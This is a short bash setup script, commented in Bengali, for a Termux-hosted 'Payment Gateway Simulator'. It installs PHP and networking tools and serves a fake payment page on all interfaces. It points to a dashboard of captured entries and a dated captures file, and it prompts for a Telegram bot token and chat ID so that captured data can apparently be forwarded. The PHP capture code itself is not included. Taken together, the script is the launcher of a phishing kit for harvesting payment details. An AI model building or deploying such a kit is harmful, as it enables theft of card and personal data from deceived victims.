#!/bin/bash

# ============================================
# TERMUX AUTOMATIC SETUP
# ============================================

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}[*] Termux Payment Gateway Simulator${NC}"
echo ""

# আপডেট
echo -e "${GREEN}[+] Updating packages...${NC}"
pkg update -y && pkg upgrade -y

# ডিপেন্ডেন্সি
echo -e "${GREEN}[+] Installing dependencies...${NC}"
pkg install -y php curl wget git openssl-tool

# ডিরেক্টরি
mkdir -p ~/payment-simulator
cd ~/payment-simulator

# ফাইল তৈরি
echo -e "${GREEN}[+] Creating files...${NC}"
# (উপরে দেওয়া কোডগুলো এখানে সেভ করুন)

# লোকাল আইপি
IP=$(ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | head -1)
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  SETUP COMPLETE!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "  Payment Page:     ${GREEN}http://$IP:8080${NC}"
echo -e "  Dashboard:        ${GREEN}http://$IP:8080/view_captures.php${NC}"
echo -e "  Captured Data:    ${GREEN}http://$IP:8080/captures_$(date +%Y-%m-%d).json${NC}"
echo ""

# টেলিগ্রাম বট চেক
if [ -f "telegram_config.txt" ]; then
    echo -e "${GREEN}  Telegram Bot:     ✓ Active${NC}"
else
    echo -e "${RED}  Telegram Bot:     ✗ Not configured${NC}"
    echo "  Run: nano ~/payment-simulator/capture.php"
    echo "  Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID"
fi
echo ""
echo -e "${GREEN}  Starting PHP server...${NC}"
php -S 0.0.0.0:8080 -t ~/payment-simulator/
